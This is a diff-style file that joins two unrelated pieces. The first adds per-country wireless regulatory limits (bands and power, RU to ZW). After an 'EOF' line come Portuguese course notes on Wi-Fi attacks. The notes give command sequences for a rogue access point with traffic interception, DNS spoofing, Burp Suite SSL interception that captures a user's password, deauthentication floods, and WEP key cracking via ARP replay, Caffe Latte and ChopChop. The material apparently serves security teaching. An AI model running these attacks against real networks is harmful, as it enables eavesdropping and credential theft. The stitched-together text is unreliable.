+	(2400 - 2483.5 @ 40), (100 mW)
+	(5150 - 5350 @ 40), (200 mW), NO-OUTDOOR
+	(5470 - 5725 @ 20), (1000 mW), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country RU: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20)
+	(5250 - 5330 @ 80), (20), DFS
+	(5650 - 5730 @ 80), (30), DFS
+	(5735 - 5835 @ 80), (30)
+
+country RW: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country SA: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country SE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country SG: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country SI: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country SK: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+# Source:
+# Regulation N° 2004-005 ART/DG/DRC/D.Rég
+country SN: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country SR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country SV: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (23), DFS
+	(5735 - 5835 @ 80), (30)
+
+country SY:
+	(2402 - 2482 @ 40), (20)
+
+# Source:
+# http://www.telecommission.tc/Spectrum-plan20110324-101210.html
+country TC: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country TD: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country TG: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 40), (20)
+	(5250 - 5330 @ 40), (20), DFS
+	(5490 - 5710 @ 40), (27), DFS
+
+country TH: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country TN: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+
+country TR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country TT: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country TW: DFS-JP
+	(2402 - 2472 @ 40), (30)
+	(5270 - 5330 @ 40), (17), DFS
+	(5490 - 5590 @ 80), (30), DFS
+	(5650 - 5710 @ 40), (30), DFS
+	(5735 - 5835 @ 80), (30)
+ 
+# Source:
+# #914 / 06 Sep 2007: http://www.ucrf.gov.ua/uk/doc/nkrz/1196068874
+# #1174 / 23 Oct 2008: http://www.nkrz.gov.ua/uk/activities/ruling/1225269361
+# (appendix 8)
+# Listed 5GHz range is a lowest common denominator for all related
+# rules in the referenced laws. Such a range is used because of
+# disputable definitions there.
+country UA: DFS-ETSI
+	(2400 - 2483.5 @ 40), (20), NO-OUTDOOR
+	(5150 - 5350 @ 40), (20), NO-OUTDOOR
+	(5490 - 5670 @ 80), (20), DFS
+	(5735 - 5835 @ 80), (20)
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country UG: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country US: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+	# 60g band
+	# reference: http://cfr.regstoday.com/47cfr15.aspx#47_CFR_15p255
+	# channels 1,2,3, EIRP=40dBm(43dBm peak)
+	(57240 - 63720 @ 2160), (40)
+
+country UY: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://cemc.uz/article/1976/
+country UZ: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+
+# Source:
+# http://www.ntrc.vc/regulations/Jun_2006_Spectrum_Managment_Regulations.pdf
+country VC: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source:
+# Official Gazette (Gaceta Oficial) concerning Unlicensed transmitter use
+# (10 June 2013)
+# http://www.conatel.gob.ve/
+country VE: DFS-FCC
+	(2402 - 2482 @ 40), (30)
+	(5170 - 5250 @ 80), (23), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country VI: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country VN: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (24), DFS
+	(5490 - 5730 @ 80), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://www.trr.vu/attachments/category/130/GURL_for_Short-range_Radiocommunication_Devices2.pdf
+country VU: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country WF: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country YE:
+	(2402 - 2482 @ 40), (20)
+
+country YT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country ZA: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country ZW: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= EOF -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Aula 12
+=======
+
+
+Man-in-The-Middle
+
+Understand the Attack				(((|)))
+						   |
+  +-----+ <--- SSID How2Security +----------> +----+ 		    ------               _____
+  | STA |                                     | AP | 		   /      \ ___\     ___/    __\_      
+  +-----+ ------+	        	      |    | ---------->  /-  ___  /    \/  /  /    /   \ _   
+ /      /  	 \	       	   	      +----+		 /     /           \__     //_     \_     
+ +-----+  <--+	  \ Connect                   			/   Internet         \   / ___       |      
+	      \	   \	        				|           ___       \/+--/         /       
+DHCP Server    \  De-Auth      					 \__           \       \            /         
+FakeSSID	\    \	       					_   \__                 |          /
+	     mon0 +-----+ eth0    				      /´      \     /____      /  /       |   	
+	      |	  | STA | -----------------------------------´	       _____/         ___       \/  /\
+	      |	  +-----+  | 	GPRS/3G/4G 			            \__      /      /    |    |
+	      |	 /      /  |					               \____/   \       /    /
+	      |	 +-----+   |      				                         -_-/\//-__-
+              |  STAttack  |
+              +-- Bridge --+             
+                            
+
+Demo!
+
+# Em uma VM basta colocar a interface em bridge e fazer o link com a eth0 da vm
+# Mapea a interface wlan usb a wlan da vm
+
+
+ifconfig eth0 up
+
+# outro terminal
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig wlan0 channel 1
+iwconfig mon0 channel 1
+
+airbase-ng --essid how2security mon0
+create at0
+
+# cria bridge
+
+brctl addr mitm
+
+brctl show
+
+brctl addif mitm eth0
+brctl addif mitm at0
+
+ifconfig at0 0.0.0.0 up
+ifconfig eth0 0.0.0.0 up
+
+ifcongig
+mitm
+
+ifconfig mitm up
+
+dhclient mitm &
+
+ifconfig mitm
+
+wireshark &
+
+capture at0
+
+acesse algum site e olhe o trafego sendo capturado pelo wireshark
+
+filter: http
+
+Hypertext Transfer Protocol
+ GET /dsd/sds/sds HTTP/1.1\r\n
+
+
+Aula 13
+=======
+
+Cont. Man-in-The-Middle
+
+SSL Man-in-The-Middle Basic
+- Already Covered in 2 previous videos
+- Links posted on this page as well
+- Please go through them if you are unaware of the basics
+- Old vids from 2008 but still in context
+
+dnsspoof --help
+
+dnsspoof -i mitm
+udp dst port 53 and not src 10.0.2.15
+
+ifconfig 
+mitm 10.0.2.15
+
+# acesse um site no dispositivo
+
+burpsuite
+
+clique guia -> proxy -> options na guia baixa
+
+local listener port: 80
+clique no botão add
+
+local listener port: 443
+clique no botão add
+
+# Acesse o Google do dispositivo
+# uma mensagem do burpsuite irá aparecer
+
+selecione port 80 em proxy listeners e clique no botão edit
+selecione a opção support invisible proxying for non-proxy-aware clients e clique no botão update
+
+repita para a porta 443
+
+clique na guia intercept e clique no botão intercept is on
+
+# no dispositivo faça um search e na interceptação troque o search dele
+GET
+/m/search?q=anti-virus&
+/m/search?q=pwned&
+
+# olhe o que foi pesquisado no dispositivo
+
+# Agora acesse o GMail o dispositivo irá informar que houve algum problema, vamos acertar isso no burpsuite
+
+clique na guia baixa options verifique se está habilitado generate CA-signed per-host certificates
+
+# aceite o certificado no dispositivo e olhe na guia baixa options e guia raw o POST, ache a senha clique em forward
+
+
+Aula 14
+=======
+
+WEP In-Depth
+
+
+WEP Basic
+- The first encryption scheme made available for Wi-Fi
+- Flawed from the get go
+- Uses RC4 encryption algorithm
+	- Symmetric Key Encryption
+- Is available on all access points
+- Tipically used by home users or manufqacturing companies
+
+WEP Internals
+
++---------+---------+
+| Todos	  | Frame   |
+| os	  | Body    |
+| Frames  |	    |
++---------+---------+
+         /	    \
+  ______/   _________\_______
+ /         /   Encrypted Note\
++---------+---------+---------+
+| IVs	  | Data   | ICV      |
+| 4 Bytes | >=1    | 4 Bytes  |
+|	  |	   |	      |
++---------+---------+---------+
+|          \
+|           \______________________
+|                                  \
++---------+-------------------------+
+| IV	  |          1 octet        |
+| 3 Bytes |----------+--------------+
+|	  |Pad 6 bits|Key ID 2 bits | --> Key ID é o número da chave Key 1 = 00, Key 2 = 01, Key 3 = 10 e Key 4 = 11
++---------+----------+--------------+
+
+# no access point habilite WEP - WEP Key length 64 bits (10 hex digits) - 4 Keys diferentes - Default WEP Keys = WEP Key 1 - # Authentication = Shared Key
+
+
+WEP Step 1 - Generating the Keystream
+
+| 24 Bits  | 40/104 Bit s |
+|  IV      | WEP Key      | --> RC4 Algorithm (KSA + PRGA) --> Random Keystream
+\___________   ___________/
+             v
+    64 or 128 bit WEP
+
+WEP Step 2 - Generating Integrity Check Value
+
+| Variable Size |               | 32 Bits |     |            |       |
+|  Data         |--- CRC-32 --> | ICV     | ==  |  Data      | ICV   |
+|               |               |         |     |            |       |
+
+WEP Step 3 - Cipher Text Generating
+
+| 24 Bits  | 40/104 Bit s |
+|  IV      | WEP Key      | --> RC4 Algorithm (KSA + PRGA) --> Random Keystream
+\___________   ___________/
+             v
+            XOR  --> | IV | Cipher Text |
+             ^
+  ___________ _________ 
+/                      \
+|            |          |
+|  Data      |    ICV   |
+|            |          |
+
+
+IEEE Diagram for Encryption - WEP encapsulation block diagram 8.2 \__ Google Images
+IEEE Diagram for Decryption - WEP decapsulation block diagram 8.3 /
+
+wireshark &
+
+filter ((wlan.addr == MAC_AP) && !(wlan.fc.type_subtype == 0x08)) && (wlan.fc.type_subtype == 0x28)
+# faça a conexão com o dispositivo, depois do association response ache o QoS Data
+
+IEEE 802.11 QoS Data
+ WEP parameters
+   Inicialization Vector: 0xca16cc
+   Key Index: 0 <-- Key ID = Key 1 - first key
+   WEP ICV: 0x8d1f929
+
+Using Wireshark to Decrypt WEP
+- Once we have the WEP key
+	- Legitimate way
+	- Or crack it =]
+- Airdecap-NG can also do the job
+
+Wireshark
+
+Statistics->WLAN Traffic
+
+Edit->Preferences->Protocol->IEEE 802.11
+Key #1 ab:cd:ef:ab:cd <-- insira a chave
+
+selecione enable decryption
+
+Clique em applay e veja que foi decriptografado
+
+apague a key e desabilite enable decryption
+
+Salve o a captura como wep-encrypt.pcap
+
+airdecap-ng
+
+airdecap-ng -w ab:cd:ef:ab:cd wep-encrypted
+
+wireshark wep-encrypt-dec
+
+
+Aula 15
+=======
+
+WEP Cracking
+
+Broken Beyond Repair
+
+2001 - The insecurity of 802.11, Mobicon, July 2001 - N. Borisov, I. Goldberg and D. Wagner.
+
+2001 - Weaknesses in the key scheduling algoritm of RC4. - S. Fluhrer, I. Mantin, A. Shamir. Aug 2001
+
+2002 - Using the Flurer, Mantin, and Shamir Attack to Break WEP - A. Stubblefiled, J. Ioannidis, A. Rubin.
+
+2004 - Koren, improves on the above technique and reduces the complexity of WEP cracking. We now require only around 500.00 packets to break the WEP key.
+
+2005 - Adreas Klein introduces more correlations between the RC4 key stream and the key.
+
+2007 - PTW extend Andreas technique to furthe simplify WEP Cracking. Now with just around 60.000 - 90.000 packets it is possible to break the WEP key.
+
+WEP Cracking
+- Different Attaks using different logic
+- Oldest one is finding "weak IVs" which reveal information about the WEP Key
+- Once you can collect a large number of weak IVs, you can crack the WEP key
+- Weak IVs are not uniformly distributed in the IV space
+- A Weak IV is key dependent
+- This is the reason why it takes some time
+
+More information
+- Its all in the code =]
+- Aircrack-NG is openm source
+- Well written and decently documented code
+- Use scope cscope and ctags
+
+
+Demo!
+
+
+apt-get install scope
+
+find . -name *.[ch]
+
+find . -name *.[ch] > cscope.files
+
+ctags `cat cscope.files`
+
+cscope -b -q 
+
+cscope -d
+
+Find this C symbol: main
+
+Crcking WEP - the script kiddie way
+- Techniques
+	- Passive Way (Wait.. wait.. wait..)
+		- Advantage - Undetectable
+		- Use directional Antenna
+		- Decrypt traffic once cracked
+	- Active Way (Patience is not you virtue)
+		- Replay attacks
+			- Stimulate network to send encrypted data packets
+		- ARP replay
+			- ARP Request, send ARP Response
+
+
+
+ARP Replay Step 1: Capture ARP Packets		(((|)))
+						   |
+  +-----+ <--- Data (ARP) ------------------> +----+ 		    ------               _____
+  | STA |                                     | AP | 		   /      \ ___\     ___/    __\_      
+  +-----+ ------+	        	      |    | ---------->  /-  ___  /    \/  /  /    /   \ _   
+ /      /  	 \	       	   	      +----+		 /     /           \__     //_     \_     
+ +-----+  	  \ Silence is Golden         			/   Internet         \   / ___       |      
+	       	   \	        				|           ___       \/+--/         /       
+	            \  Listen ARP      				 \__           \       \            /         
+		     \	       					   \__                 |          /
+	          +-----+ eth0    				        \     /____      /  /       |   	
+	      	  | STA | 					       _____/         ___       \/  /\
+	      	  +-----+ 		 			            \__      /      /    |    |
+	         /      /  					               \____/   \       /    /
+	      	 +-----+         				                         -_-/\//-__-
+                 STAttack  
+                          
+- How does the Attacker identify the ARP Packets? Aren't they encrypted?
+- ARP packets are of a fixed unique size, easy to identity even if encrypt
+- Capture ARP Request packets using encrypted packet size and Destin
+- Relay them blindly, and see if the network responds back!
+- If yes, then we found ourselves Winner =] =]                            
+
+ARP Replay Step 2: Replay Pacjets to AP
+				  (((|)))
+				     |
+ +-----+			+----+
+ | STA |			| AP |
+ +-----+ 			|    | 
+/      / 			+----+
++-----+  			
+   | Encrypted ARP Packet ------> |
+   | <---- Encrypted ARP Response |
+   | Encrypted ARP Packet ------> |
+   | <---- Encrypted ARP Response |
+   | Encrypted ARP Packet ------> |
+   | <---- Encrypted ARP Response |
+   |                              |
+
+ARP Replay Step 3: Collect Packets and use Aircrack-NG
+
+aircrack-ng
+
+Demo!
+
+airodump-ng --channel 1 mon0 --write onlimne_cracking --bssid MAC_AP
+
+# outro terminal - Gerar ARP, precisa capturar um ARP Request passando - isso é possível porque os pacotes ARP tem tamanho fixo
+
+aireplay-ng
+
+aireplay-ng --arpreplay -e how2security mon0
+
+# outro terminal - Desautenticar para injetar ARP 
+
+aireplay-ng --deauth 0 -e how2security mon0
+^C
+
+# volte ao terminal onde estamos injetando ARP e execute o seguinte comento
+
+aireplay-ng --arpreplay -e how2security -h MAC_STA
+
+# volte ao terminal onde estamos desautenticamos para fazer-lo novamengte
+
+aireplay-ng --deauth 0 -e how2security mon0
+^C
+
+# outro terminal
+
+aircrack-ng online_ckracking-01.cap
+
+KEY FOUND [AB:CD:EF:AB:CD]
+
+airdecap-ng online_cracking-01.cap -w ab:cd:ef:ab:cd
+
+wireshark online_cracking-01-decap.cap &
+
+Aula 16
+=======
+
+Cafe Latte Attack Basics
+
+Its not just the encryption
+- Message injection attacks
+	- No replay protection
+	- aireplay-ng arp replay
+- Message injection
+	- ChopChop attack
+	- Caffe latte attack
+	- Fragmentation attack
+	- Hirte attack
+
+Message Modification
+- CRC-32 is a linear function of the message, hence checksum os distributive over XOR
+- Thus we can tamper arbitrary byte locations in the packet and patch the checksum
+- Thus will be a valid packet accepted by the access point
+
+Original Research Paper: Intercepting Mobile Communications
+
+
+What does this mean for us?
+
++---------+---------+
+| Todos	  | Frame   |
+| os	  | Body    |
+| Frames  |	    |
++---------+---------+
+         /	    |
+  ______/   	    | 
+ / Encrypted Note   \
++---------+---------+
+| Data   | ICV      |
+| >=1    | 4 Bytes  |
+|	 |          |
++---------+---------+
+
++---------+---------+
+| Data    | ICV     |
+|         |         |
+|	  |         |
++---------+---------+
+       XOR
++-------------------+
+|                   |
+|  RC4 Keystream    |
+|	            |
++-------------------+
+
+Create a Bit Mask without knowwing Plain Text
+
++---------+---------+
+| Todos	  | Frame   |
+| os	  | Body    |
+| Frames  |	    |
++---------+---------+
+         /	    |
+  ______/   	    | 
+ / Encrypted Note   \
++---------+---------+
+| Data   | ICV      |
+| >=1    | 4 Bytes  |
+|	 |          |
++---------+---------+
+
++---------+
+| Attacker|
+| Modifi  |
+|	  |
++---------+
+
++---------+		+---------+
+| ICV     |		| Attacker|
+| Patch   | = CRC-32 of	| Modifi  | 
+|	  |		|	  |
++---------+ 		+---------+
+
+
+Patching a Valid Packet
+
+
++---------+---------+
+| Todos	  | Frame   |
+| os	  | Body    |
+| Frames  |	    |
++---------+---------+
+         /	    |
+  ______/   	    | 
+ / Encrypted Note   \
++---------+---------+
+| Data   | ICV      |
+| >=1    | 4 Bytes  |
+|	 |          |
++---------+---------+
+         XOR
++---------+---------+
+| Attacker| ICV     |
+| Modifi  | Patch   |
+|	  |	    |
++---------+---------+ 
+          ||
++---------+---------+
+| Modified| ICV     |
+| Encrypt |         | = Valid Encrypted Packetc!
+| Data	  |	    |
++---------+---------+
+
+Behind the scenes
+
++---------+---------+
+| Todos	  | Frame   |
+| os	  | Body    |
+| Frames  |	    |
++---------+---------+
+         /	    |
+  ______/   	    | 
+ / Encrypted Note   \
++---------+---------+
+| Data   | ICV      |
+| >=1    | 4 Bytes  |
+|	 |          |
++---------+---------+
+         XOR
++-------------------+
+|                   |
+|  RC4 Keystream    |
+|	            |
++-------------------+
+         XOR
++---------+---------+
+| Attacker| ICV     |
+| Modifi  | Patch   |
+|	  |	    |
++---------+---------+ 
+
+A (XOR) B (XOR) C = [A (XOR) C] (XOR) B
+
+
+Repercussions
+- We can modify arbitrary data in a WEP packet and patch the ICV
+- This is a valid WEP packet which will be accepted by the access point/client
+
+- Caffe latte attack modifies a gratuitous ARP packet to change it to a ARP Request packet for the same host!
+- Host Replies and we collect these packets crack the WEP key
+
+A cup of caffe latte served with the wep key! =]
+
+				  (((|)))
+	  +-- FMS, Korek PTW ----->  |
+ +-----+ /			+----+					(((+-----+ Can your keys cracked when roaming
+ | STA |/ +-- No Mutual Auth -> | AP |					   | STA | clients are miles away from the
+ +-----+ /			|    | 					   +-----+  operational network?
+/      / -- Message Modifies -> +----+				          /      /
++-----+  \			  ^				          +-----+
+	  +-- Message Injection -´
+
+
+Using known methods, exposure is limited RF range of WEP enables network
+
+- Can we somehow have an isolated client generate WEP encrypted data packets using the authorized network's key?
+- Windows caches the WEP key of networks in its PNL
+- To crack WEP all we need is encrypted data packets
+	- 80 K for PTW attack
+	- 500 K for   attack
+- It does not m
+
+
+				  (((|)))
+				     |
+ +-----+			+----+
+ | STA |			|Fake|
+ +-----+ 			| AP | 
+/      / 			+----+
++-----+  			
+   | Probe Request default -----> |
+   | <------------ Probe Response | Can you force a WEP client connect to a honeypot without having knowledge of the key?
+   | Auth Request --------------> |
+   | <-------------- Auth Success |
+   | Assoc Request -------------> |
+   | <------------ Assoc Response |
+   | Data ----------------------> |
+   | Data ----------------------> |
+
+
+Demo!
+
+ifconfig
+airodump-ng --channel 1 mon0
+
+# pegue as redes que a sta se conecta automaticamente
+
+airbase-ng -W 1 --essid how2security -c 1 mon0
+
+wireshark &
+
+capture mon0
+
+filter: (wlan.addr == MAC do STA Atacante) && !(wlan.fc.type_subtype == 0x08)
+
+# Aguarde a STA se associar, depois disso, de uma olhada no wireshark a procura da tentativa de autenticar na rede how2security
+1º Pacote
+IEEE 802.11 wireless LAN Management frame
+ Fixed paramaters
+  Autehntication algoritm: Shared key (1)
+  Authentication Seq: 0x0001
+2º pacote
+IEEE 802.11 wireless LAN Management frame
+ Fixed paramaters
+  Autehntication algoritm: Shared key (1)
+  Authentication Seq: 0x0002
+  status code: Successful
+ Tagged paramaters
+  Challenge text
+   Tag number: 16
+   Tag length: 128
+  Tag interpretation: Challenge text: q24r2r34t535y4h4j46jj6....
+3º pacote
+Data
+ Data: 1219e102je0183hr0318rh038rh03r8h103rh038rh203rh2...
+  Autehntication algoritm: Shared key (1)
+  Authentication Seq: 0x0001
+
+Clique em Edit->Preferences->Protocols->IEEE802.11
+
+deselecionar Enable decryption bit
+key #1 ab:cd:ef:ab:cd
+clique em apply->OK
+
+
+Aula 17
+=======
+Caffe Latte Attack Demo
+- Once the client connects to the fake ap it will send out DHCP requests
+- DHCP will time out eentually
+- Auto-configuratio IP address will kick in
+- Client will send a Gratuitous ARP packet
+
+Let us verify!
+
+airbase-ng -c 1 --essid how2security -W 1 mon0
+
+
+
+wireshark &
+
+capture mon0
+
+filter: ((wlan.bssid == MAC do STA Atacante) && (wlan.fc.type_subtype == 0x20)) && (wlan.fc.type == 0x0806) tem que vim apenas os arp who e gratuitous arp
+
+
+# conect com seu dispositivo
+
+Caffe Latte - Open + Static IP
+
+				  (((|)))
+				     |
+ +-----+			+----+
+ | STA |			|Fake|
+ +-----+ 			| AP | 
+/      / 			+----+
++-----+  			
+   | Probe Request default -----> |
+   | <------------ Probe Response | Lets say Client IP is 5.5.5.5
+   | Auth Request --------------> | - After association, the client sends Gratuitous ARP for 5.5.5.5
+   | <-------------- Auth Success | - Can we use this ARP packet so
+   | Assoc Request -------------> |
+   | <------------ Assoc Response |
+   | Gratuitous ARP ------------> |
+   | Gratuitous ARP ------------> |
+   | Gratuitous ARP ------------> |
+   | Gratuitous ARP ------------> |
+
+
++-------------------+
+|                   |
+|  ARP Header       |
+|	            |
++-------------------+
+|		     \__________________________________________________________
+|'										\
++-------------------+-------------------+-------------------+-------------------+
+|                   |                   |                   |                   |
+|  Sender MAC       | Sender IP         | Target MAC        | Target IP         |
+|	            |                   |                   |                   |
++-------------------+-------------------+-------------------+-------------------+
+
+AA:AA:AA:AA:AA:AA        05.05.05.05				05.05.05.05
+	XOR		     XOR				    XOR
+00:00:00:00:00:00	 00.00.00.FF				00.00.00.00
+------------------------------------------------------------------------------
+AA:AA:AA:AA:AA:55	 05.05.05.FA				05.05.05.05
+			  5.5.5.250
+				  	    (((|)))
+				     	       |
+ +-----+				  +----+
+ | STA |				  |Fake|
+ +-----+ 				  | AP | 
+/      / 				  +----+
++-----+  Connection Established			
+   | <-------------------------------------> |
+   | 					     | Lets say Client IP is 5.5.5.5
+   | <--- ARP Req for 5.5.5.5 from 5.5.5.250 | - After association, the client sends Gratuitous ARP for 5.5.5.5
+   | 					     | - Can we use this ARP packet so
+   | ARP Res for 5.5.5.250 from 5.5.5.5 ---> |
+   |					     |
+   | <--- ARP Req for 5.5.5.5 from 5.5.5.250 |
+   | 					     |
+   | ARP Res for 5.5.5.250 from 5.5.5.5 ---> |
+   | 					     |
+
+
+airbase-ng -c 1 --essid how2security -L -x 10 -W 1 mon0
+
+# -L Caffe Latte e -x <num> Número de pacotes por segundo.
+
+wireshark &
+
+capture mon0
+
+filter: ((wlan.bssid == MAC do STA Atacante) && (wlan.fc.type_subtype == 0x20)) && (wlan.fc.type == 0x0806) tem que vim apenas os arp who e gratuitous arp
+
+# em outro terminal
+
+airodump-ng --channel 1 mon0 --wirte caffelatte
+
+# conecte com seu dispositivo
+
+# pare o fakeap e inicie sem o limite de 10 pacotes por segundos
+airbase-ng -c 1 --essid how2security -L -W 1 mon0
+
+
+Caffe Latte for Open _ Static IP - Analysis
+- Capture an ARP packet and bit flipping it: ~1 msec =]
+- ARP Request/Response Flood: 4-5 minutes (to get 80.000 packets)
+- Key cracking with Aircrack-NG: ~1 minute
+
+Bit Flipping works for wall the cases
+
++-----------------------+---------------------------+
+| Network Configuration | Approximate Cracking Time |
++-----------------------+---------------------------+
+| Shared + DHCP         | ~6 minutes		    |
++-----------------------+---------------------------+
+| Shared + Static IP    | ~6 minutes		    |
++-----------------------+---------------------------+
+| Open + DHCP		| ~6 minutes		    |
++-----------------------+---------------------------+
+| Open + Static		| ~6 minutes		    |
++-----------------------+---------------------------+
+
+Problems and Issues
+- VM may hang due to huge I/O over the USB
+- Better to use the reqal machine
+- Aircrack-NG does not seem to work properly always
+	- Need to investigate further
+	- Maybe patch / new tool soom!
+
+Aula 18
+=======
+
+Korek's ChopChop Attack
+
+Decrypt entire WEP packet byte by byte
+- Can be orchestrated in 2 modes:
+	- Authentication to AP
+		- Packet is replayed by the AP over the air
+	- Unathentication to AP
+		- Some APs send a de-authentication packet if the WEP packet is valid but MAC is not associated
+		- May not work always
+
+Ele fragmenta todo o pacote criptografado e exclui um pacote e faz uma força bruta nele até descobrir qual oconteudo foi aceito depois de passar pelo CRC-32, fazendo isso com todos os pacotes até conseguir enviar um pacote criptografado, em que ele saiba o conteúdo em cleantext desse pacote.
+
+aireplay-ng --chopchop -e how2security mon0
+
+
+use this packet? y
+
+wireshark relay_decxxx.cap &
+
+Aula 19
+=======
+Fragmentation and Hirte Attack
+
+Understanding Fragmentation
+
+Hirte Attack
+- Use key concepts from the Caffe Latte attack and framgmentation attack
